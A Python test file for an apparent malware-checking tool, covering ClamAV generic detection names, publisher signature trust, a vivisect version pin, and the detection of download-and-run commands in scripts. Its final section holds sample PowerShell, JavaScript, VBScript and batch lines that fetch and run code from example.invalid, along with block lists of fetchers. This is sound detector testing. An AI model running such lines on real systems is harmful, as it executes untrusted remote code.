"""Second false-alarm round (2026-10-29): well-known publishers vs. other signatures, ClamAV's generic
names, the vivisect version pin, and download commands that only appear in lists or comments."""

import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr
from pathlib import Path
from unittest import mock

from blotter import capa_fast, config
from blotter.analyze import filetype, program, scripts
from blotter.checks import capabilities, clamav as clamav_check
from blotter.checks import scripts as scripts_check
from blotter.checks import signature as signature_check
from blotter.findings import CLEAR, HIDING, MALICIOUS, NOTE, SIGNED, SUSPICIOUS, UNKNOWN, UNKNOWN_ONLINE, UNSIGNED, \
    Finding, risky, weak
from blotter.verdict import decide

ROOT = Path(__file__).resolve().parent.parent
SYSTEM32 = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32"
RAN = Finding("filetype", CLEAR, "It is a Windows program (EXE).")
DISCORD = "Win.Packed.Mikey-9859574-0"  # what ClamAV said about DiscordSetup.exe (signed by Discord Inc.)


def well_known(publisher="Discord Inc."):
    return Finding("signature", CLEAR, f"Signed by {publisher}.", {"trusted_publisher": publisher}, [SIGNED])


def other_signature(publisher="Example Tools Ltd"):
    return Finding("signature", CLEAR, f"Signed by {publisher}.", {"signed_by": publisher}, [SIGNED])


UNSIGNED_F = Finding("signature", NOTE, "It isn't digitally signed.", {}, [UNSIGNED])
VT_NEVER_SAW = Finding("virustotal", UNKNOWN, "VirusTotal has no record of it.", {}, [UNKNOWN_ONLINE])


def clam(name):
    [found] = clamav_check.interpret(f"stream: {name} FOUND")
    return found


# ---- 1. ClamAV's generic names are weak engine signals ----

class ClamAVGenericTests(unittest.TestCase):
    def test_generic_names_are_suspicious_at_most(self):
        for name in (DISCORD, "Win.Packer.Themida-1", "Heuristics.Phishing.Email", "PUA.Win.Tool.Nirsoft-1",
                     "Win.Trojan.Generic-6331812-0"):
            found = clam(name)
            self.assertEqual(found.level, SUSPICIOUS, name)
            self.assertTrue(found.details["generic"], name)
            self.assertEqual(decide([RAN, UNSIGNED_F, found])["verdict"], "suspicious", name)
        self.assertEqual(clam(DISCORD).details["generic"], "packer")

    def test_discord_case_well_known_publisher_is_unusual_with_the_note(self):
        v = decide([RAN, well_known("Discord Inc."), clam(DISCORD)])
        self.assertEqual(v["verdict"], "unusual", v)
        self.assertIn("ClamAV's generic packer guess; the file is signed by Discord Inc.", v["summary"])
        self.assertIn("ClamAV's generic packer guess; the file is signed by Discord Inc.", v["reasons"])

    def test_other_signatures_dont_lower_a_generic_guess(self):
        self.assertEqual(decide([RAN, other_signature(), clam(DISCORD)])["verdict"], "suspicious")

    def test_named_families_stay_malicious_even_for_well_known_publishers(self):
        for name in ("Win.Trojan.AgentTesla-9876543-0", "Win.Ransomware.Lockbit-1", "Win.Malware.Zusy-1"):
            found = clam(name)
            self.assertEqual(found.level, MALICIOUS, name)
            self.assertNotIn("generic", found.details, name)
            for sig in (well_known("Microsoft Windows"), other_signature(), UNSIGNED_F):
                self.assertEqual(decide([RAN, sig, found])["verdict"], "malicious", name)
            self.assertEqual(decide([RAN, well_known(), found], trusted=True)["verdict"], "malicious", name)

    def test_size_limits_are_still_unchecked_not_generic(self):
        found = clam("Heuristics.Limits.Exceeded.MaxScanTime")
        self.assertNotIn("generic", found.details)
        self.assertEqual(decide([RAN, well_known(), found])["verdict"], "couldnt_fully_check")

    def test_trust_doesnt_hide_the_guess(self):
        v = decide([RAN, well_known(), clam(DISCORD)], trusted=True)
        self.assertEqual(v["verdict"], "unusual")
        self.assertIn("now flagged", v["summary"])

    def test_a_guess_plus_another_engine_still_counts_that_engine(self):
        named = clam("Win.Trojan.AgentTesla-1")
        self.assertEqual(decide([RAN, well_known(), clam(DISCORD), named])["verdict"], "malicious")


# ---- 2. well-known publishers vs. any other valid signature ----

class PublisherListTests(unittest.TestCase):
    def test_list_has_the_expected_publishers(self):
        names = program.well_known_publishers()
        for name in ("microsoft windows", "microsoft corporation", "google llc", "apple inc.", "valve corp.",
                     "mozilla corporation", "nvidia corporation", "advanced micro devices, inc.", "intel corporation",
                     "adobe inc.", "oracle america, inc.", "discord inc.", "python software foundation",
                     "johannes schindelin"):
            self.assertIn(name, names)
        self.assertNotIn("microsoft windows hardware compatibility publisher", names,
                         "that one signs other companies' drivers")

    def test_names_with_commas_are_read_whole(self):
        self.assertEqual(program._common_name('CN="Advanced Micro Devices, Inc.", O="Advanced Micro Devices, Inc."'),
                         "Advanced Micro Devices, Inc.")
        self.assertEqual(program._common_name("CN=Discord Inc., O=Discord Inc., C=US"), "Discord Inc.")

    def test_real_copy_signed_by_microsoft_is_well_known_and_others_are_not(self):
        copy = Path(tempfile.mkdtemp()) / "copy.blotter"
        shutil.copyfile(SYSTEM32 / "certutil.exe", copy)
        [found] = signature_check.scan(copy)
        self.assertEqual(found.details.get("trusted_publisher"), "Microsoft Windows")
        with mock.patch.object(program, "well_known_publishers", return_value=set()):
            [other] = signature_check.scan(copy)
        self.assertEqual(other.signals, [SIGNED])
        self.assertNotIn("trusted_publisher", other.details)
        self.assertEqual(other.details["signed_by"], "Microsoft Windows")
        self.assertIn("isn't on Blotter's short list", other.text)


class MildSignatureTests(unittest.TestCase):
    INJECT = risky("capa", "inject", "It can inject code into other running programs.")
    WATCHED = Finding("capa", NOTE, "It checks whether it is being watched.", {"ability": "anti-analysis"}, [HIDING])

    def test_risky_abilities_with_an_unknown_publisher_still_reach_unusual(self):
        self.assertEqual(decide([RAN, well_known(), self.INJECT])["verdict"], "no_known_detections")
        self.assertEqual(decide([RAN, other_signature(), self.INJECT])["verdict"], "unusual")

    def test_and_suspicious_with_two_reasons(self):
        self.assertEqual(decide([RAN, UNSIGNED_F, self.INJECT, self.WATCHED])["verdict"], "suspicious")
        self.assertEqual(decide([RAN, other_signature(), self.INJECT, self.WATCHED])["verdict"], "unusual",
                         "the signature forgives one reason")
        v = decide([RAN, other_signature(), self.INJECT, self.WATCHED, VT_NEVER_SAW])
        self.assertEqual(v["verdict"], "suspicious")
        self.assertIn("Example Tools Ltd", v["summary"])

    def test_weak_signs_count_one_step_lower(self):
        card = weak("capa", "card-numbers", "It checks card-like numbers.")
        packed = Finding("program", NOTE, "Packed.", {}, ["packed"])
        self.assertEqual(decide([RAN, UNSIGNED_F, card])["verdict"], "unusual")
        self.assertEqual(decide([RAN, other_signature(), card, packed])["verdict"], "no_known_detections")
        self.assertEqual(decide([RAN, other_signature(), card, packed, VT_NEVER_SAW])["verdict"], "unusual")

    def test_padding_and_disguise_rules_are_unchanged(self):
        disguised = Finding("filetype", NOTE, "Really a program named .jpg.", {}, ["disguised", "lying_name"])
        self.assertEqual(decide([RAN, other_signature(), disguised])["verdict"], "suspicious")


# ---- 4. the vivisect fix: pinned version, applied from Blotter's code ----

class VivisectPinTests(unittest.TestCase):
    def test_pinned_to_the_installed_version(self):
        from importlib import metadata
        self.assertEqual(metadata.version("vivisect"), capa_fast.VIVISECT,
                         "vivisect changed: re-measure the fix, then update VIVISECT")

    def test_other_versions_run_without_the_fix_and_warn(self):
        import envi
        original = envi.getArchModules
        err = io.StringIO()
        with mock.patch.object(envi, "getArchModules", original), \
             mock.patch("importlib.metadata.version", return_value="9.9.9"), redirect_stderr(err):
            self.assertFalse(capa_fast.install())
            self.assertIs(envi.getArchModules, original, "not patched")
        self.assertIn(capa_fast.WARNING, err.getvalue())
        self.assertIn("9.9.9", err.getvalue())

    def test_the_card_says_when_the_fix_was_skipped(self):
        exe = Path(tempfile.mkdtemp()) / "a.blotter"
        from tests import samples
        exe.write_bytes(samples.minimal_pe())
        answer = json.dumps({"rules": {}}).encode()
        warning = f"{capa_fast.WARNING} vivisect is 9.9.9".encode()
        with mock.patch.object(config, "CAPA_RULES", Path(tempfile.mkdtemp())), \
             mock.patch("blotter.procs.run", return_value=(0, answer, warning)):
            found = capabilities.scan(exe)
        self.assertTrue(any("without Blotter's speed fix" in f.text for f in found), [f.text for f in found])

    def test_fix_is_applied_in_capas_own_process(self):
        """The worker starts blotter.capa_fast, which installs the fix before capa.main runs."""
        code = ("import sys, runpy; sys.argv=['x','--version']; import blotter.capa_fast as c; c.install(); "
                "import envi; print(getattr(envi.getArchModules, '_blotter_cached', False))")
        out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, cwd=str(ROOT), timeout=120)
        self.assertEqual(out.stdout.strip(), "True", out.stderr)

    def test_same_capa_results_with_and_without_the_fix_on_real_programs(self):
        rules = Path(os.environ.get("LOCALAPPDATA", "")) / "Blotter" / "rules" / "capa"
        if not rules.is_dir():
            self.skipTest("capa's rules aren't downloaded on this PC")
        folder = Path(tempfile.mkdtemp())
        targets = []
        for name in ("whoami.exe", "findstr.exe", "sort.exe"):
            if (SYSTEM32 / name).is_file():
                targets.append(folder / name)
                shutil.copyfile(SYSTEM32 / name, targets[-1])
        self.assertGreaterEqual(len(targets), 2)
        sigs = rules.parent / "capa-sigs"
        env = {**os.environ, "PYTHONPATH": str(ROOT)}
        for target in targets:
            args = ["-j", "-q", "-r", str(rules), "-s", str(sigs), str(target)]
            plain = subprocess.run([sys.executable, "-I", "-m", "capa.main", *args], capture_output=True,
                                   timeout=900)
            fast = subprocess.run([sys.executable, "-m", "blotter.capa_fast", *args], capture_output=True,
                                  timeout=900, env=env, cwd=str(ROOT))
            self.assertNotIn(capa_fast.WARNING.encode(), fast.stderr, "the fix was applied")
            a, b = json.loads(plain.stdout), json.loads(fast.stdout)
            self.assertTrue(a["rules"], target.name)
            self.assertEqual({k: sorted(map(str, v["matches"])) for k, v in a["rules"].items()},
                             {k: sorted(map(str, v["matches"])) for k, v in b["rules"].items()}, target.name)


# ---- 5. download commands in a blocklist, a list of strings or comments ----

class BlocklistScriptTests(unittest.TestCase):
    TEXT = filetype.FileType("text", "", "text", {})

    def abilities(self, text: str, name: str):
        return {f.details.get("ability") for f in scripts_check.judge(self.TEXT, name, text.encode())}

    GUARD_JS = """// Refuse commands that download and run things, e.g. iwr https://x/a.exe; Start-Process a.exe
const FETCHERS = new Set(['curl', 'wget', 'iwr', 'irm', 'invoke-webrequest', 'invoke-restmethod']);
const RUNNERS = ["start-process", "powershell ", "mshta", "rundll32"];
/* never allowed: new ActiveXObject("WScript.Shell").Run("powershell iwr http://example.invalid/a.exe") */
function blocked(cmd) { return [...FETCHERS].some((f) => cmd.toLowerCase().includes(f)); }
module.exports = { blocked };
"""
    GUARD_PS1 = """# Blocks downloads such as: Invoke-WebRequest https://x -OutFile a.exe; Start-Process a.exe
$blocked = @('Invoke-WebRequest', 'Start-BitsTransfer', 'Start-Process')
$also = 'iwr', 'irm', 'curl.exe'
<# Invoke-WebRequest https://example.invalid/a.exe -OutFile a.exe
   Start-Process a.exe #>
if ($blocked -contains $args[0]) { Write-Host "blocked" }
"""

    def test_a_blocklist_isnt_download_and_run(self):
        self.assertFalse({"download", "download-run"} & self.abilities(self.GUARD_JS, "guard.js"))
        self.assertFalse({"download", "download-run"} & self.abilities(self.GUARD_PS1, "guard.ps1"))
        vbs = "' Not allowed: CreateObject(\"MSXML2.XMLHTTP\") then WScript.Shell .Run\nREM downloadfile\nWScript.Echo \"hi\"\n"
        self.assertFalse({"download", "download-run"} & self.abilities(vbs, "note.vbs"))
        bat = "@echo off\r\nrem curl https://example.invalid/a.exe -o a.exe & start a.exe\r\n:: Invoke-WebRequest\r\necho hi\r\n"
        self.assertFalse({"download", "download-run"} & self.abilities(bat, "note.bat"))

    def test_real_downloads_still_count(self):
        js = ('var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", "https://example.invalid/a.exe", false);\n'
              'new ActiveXObject("WScript.Shell").Run("a.exe");\n')
        self.assertIn("download-run", self.abilities(js, "a.js"))
        ps1 = "# harmless comment\nInvoke-WebRequest https://example.invalid/a.exe -OutFile a.exe\nStart-Process a.exe\n"
        self.assertIn("download-run", self.abilities(ps1, "a.ps1"))
        self.assertIn("download-run", self.abilities(
            "curl https://example.invalid/a.exe -o a.exe\r\nstart \"\" a.exe\r\n", "a.bat"))
        self.assertIn("download-run", self.abilities(
            "$u = 'https://example.invalid/a.ps1 # not a comment'; iex (iwr $u)\n", "a.ps1"),
            "a # inside a string isn't a comment")

    def test_a_list_that_is_turned_into_code_still_counts(self):
        ps1 = "$p = @('Invoke-WebRequest', 'https://example.invalid/a.ps1'); iex ($p -join ' ')\n"
        self.assertIn("download-run", self.abilities(ps1, "a.ps1"))
        js = "var parts = ['Invoke-WebRequest', 'https://example.invalid/a.ps1']; eval(parts.join(' ')); WScript.Run(1)\n"
        self.assertIn("download-run", self.abilities(js, "a.js"))

    # A blocklist of download-and-run commands, then one line that hands a list item to code that runs text.
    # Only read as text, never run; the addresses are example.invalid.
    LISTS = {
        "ps1": "$cmds = @('Invoke-WebRequest https://example.invalid/a.exe -OutFile a.exe', 'Start-Process a.exe')\n",
        "js": 'const BLOCKED = ["powershell iwr https://example.invalid/a.exe", "start-process a.exe"];\n',
        "vbs": 'cmds = Array("powershell iwr https://example.invalid/a.exe", "start-process a.exe")\n',
        "bat": 'set BLOCKED="curl https://example.invalid/a.exe -o a.exe","cmd /c a.exe","iwr"\r\n',
    }
    SINKS = [
        ("ps1", "Invoke-Expression", "iex $cmds[0]\n"),
        ("ps1", "Invoke-Expression", "Invoke-Expression $cmds[0]\n"),
        ("ps1", "Invoke-Command", "foreach ($c in $cmds) { Invoke-Command -ArgumentList $c -ScriptBlock { param($x) } }\n"),
        ("ps1", "[scriptblock]::Create", "$block = [scriptblock]::Create($cmds[0])\n"),
        ("ps1", "$ExecutionContext", "$ExecutionContext.InvokeCommand.InvokeScript($cmds[0])\n"),
        ("ps1", "Add-Type", "Add-Type -TypeDefinition $cmds[0]\n"),
        ("ps1", "& (call operator)", "& $cmds[1]\n"),
        ("ps1", ". (dot source)", ". $cmds[1]\n"),
        ("ps1", "Start-Process with a variable", "Start-Process -FilePath $cmds[1]\n"),
        ("ps1", "cmd /c with a variable", "cmd.exe /c $cmds[1]\n"),
        ("js", "eval", "eval(BLOCKED[0]);\n"),
        ("js", "Function()", "new Function(BLOCKED[0])();\n"),
        ("js", "Function()", "Function('c', 'return c')(BLOCKED[0]);\n"),
        ("js", "child_process with a variable", 'const cp = require("child_process");\ncp.execSync(BLOCKED[0]);\n'),
        ("js", "WScript.Shell with a variable", 'new ActiveXObject("WScript.Shell").Run(BLOCKED[0]);\n'),
        ("vbs", "Execute / ExecuteGlobal", "Execute cmds(0)\n"),
        ("vbs", "Execute / ExecuteGlobal", "ExecuteGlobal cmds(0)\n"),
        ("vbs", "Eval", "x = Eval(cmds(0))\n"),
        ("vbs", "WScript.Shell with a variable", 'CreateObject("WScript.Shell").Run "cmd /c " & cmds(0), 1\n'),
        ("bat", "a variable run as a command", "for %%c in (%BLOCKED%) do %%~c\r\n"),
        ("bat", "cmd /c with a variable", "cmd /c %BLOCKED%\r\n"),
        ("bat", "start with a variable", 'start "" %BLOCKED%\r\n'),
    ]

    def test_every_kind_of_code_that_runs_text_is_recognised(self):
        for lang, sink, line in self.SINKS:
            with self.subTest(sink=sink, line=line):
                self.assertIn(sink, scripts.runs_text(line, lang))

    def test_a_list_that_reaches_code_that_runs_text_counts(self):
        for lang, sink, line in self.SINKS:
            with self.subTest(sink=sink, line=line):
                found = self.abilities(self.LISTS[lang] + line, f"a.{lang}")
                self.assertIn("download-run", found)

    def test_the_same_lists_alone_are_only_lists(self):
        for lang, text in self.LISTS.items():
            with self.subTest(lang=lang):
                self.assertFalse({"download", "download-run"} & self.abilities(text + "\n", f"a.{lang}"))

    def test_plain_text_commands_and_names_in_the_list_dont_count(self):
        """Running a fixed program (no variable) can't run a list item; a list that names iex/eval is a list."""
        fixed = {
            "ps1": "Start-Process 'notepad.exe'\n& 'C:\\Tools\\tool.exe' /quiet\nif ($cmds -contains $args[0]) { 'no' }\n",
            "js": 'const cp = require("child_process");\ncp.execSync("git status");\ncp.execFile("git", "-v");\n',
            "vbs": 'CreateObject("WScript.Shell").Run "notepad.exe", 1\nSet m = re.Execute(cmds(0))\n',
            "bat": 'start "" notepad.exe\r\ncmd /c dir\r\n',
        }
        for lang, text in fixed.items():
            with self.subTest(lang=lang):
                self.assertEqual([], scripts.runs_text(text, lang))
                self.assertFalse({"download", "download-run"} & self.abilities(self.LISTS[lang] + text, f"a.{lang}"))
        names = "$blocked = @('iex', 'Invoke-Expression', 'Invoke-WebRequest https://x', 'Start-Process $x')\n"
        self.assertFalse({"download", "download-run"} & self.abilities(names, "a.ps1"))
        js = "const BAD = ['eval(', 'child_process', 'curl https://example.invalid/a | sh', 'powershell -c x'];\n"
        self.assertFalse({"download", "download-run"} & self.abilities(js, "a.js"))

    def test_a_list_handed_straight_to_a_program_is_a_command(self):
        js = ('const cp = require("child_process");\n'
              'cp.spawn("powershell", ["-c", "iwr https://example.invalid/a.exe -OutFile a.exe; start-process a.exe"]);\n')
        self.assertIn("download-run", self.abilities(js, "a.js"))

    def test_code_only_keeps_strings_in_place(self):
        code = scripts.code_only("x = 'http://a//b' // comment\n", "js")
        self.assertIn("'http://a//b'", code)
        self.assertNotIn("comment", code)


if __name__ == "__main__":
    unittest.main()
